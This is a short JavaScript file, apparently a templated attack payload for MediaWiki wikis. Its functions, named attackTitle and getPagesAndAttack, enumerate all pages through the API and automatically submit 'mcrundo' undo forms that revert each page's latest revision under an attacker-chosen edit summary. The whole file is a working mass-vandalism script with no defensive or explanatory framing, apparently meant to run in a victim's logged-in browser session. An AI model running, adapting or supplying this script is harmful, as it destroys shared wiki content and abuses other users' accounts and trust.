function attackTitle(title) {
    $.get("%%mw_prefix%%/index.php?title=" + encodeURIComponent(title) + "&offset=&limit=500&action=history", function (hst) {
        var mcrundo_url = $(hst).find('a[href*="&diff="]').last().attr("href")
            .replace(/(?:&type=revision)?&diff=(\d+)&oldid=(\d+)/g, "&action=mcrundo&undo=$1&undoafter=$2");
        $.get(mcrundo_url, function (mcr) {
            var mcr_form = $(mcr).find("#mw-mcrundo-form");
            var mcr_form_payload = mcr_form.serialize()
                .replace(/wpSummary=[^&]*/g, "wpSummary=" + "%%urlenc_summary%%");
            mcr_form_payload += "&wpSave=1";
            var mcr_form_url = mcr_form.attr("action");
            $.ajax({
                type : "POST",
                url : mcr_form_url,
                data : mcr_form_payload
            }, function (d) {});
        })
    })
}
function getPagesAndAttack(startFrom) {
    var pgquery = "%%mw_prefix%%/api.php?action=query&format=json&list=allpages&aplimit=500";
    if (startFrom != "") {
        pgquery += "&apfrom=" + encodeURIComponent(startFrom);
    }
    $.get(pgquery, function (res) {
        for (var i = 0; i < res["query"]["allpages"].length; i ++) {
            attackTitle(res["query"]["allpages"][i]["title"]);
            if (false && i == res["query"]["allpages"].length - 1) {
                console.log("Starting from " + res["query"]["allpages"][i]["title"] + " in 30 seconds");
                setTimeout(function() {
                    getPagesAndAttack(res["query"]["allpages"][i]["title"])
                }, 30 * 1000);
            }
        }
    })
}
getPagesAndAttack("%%start_from%%");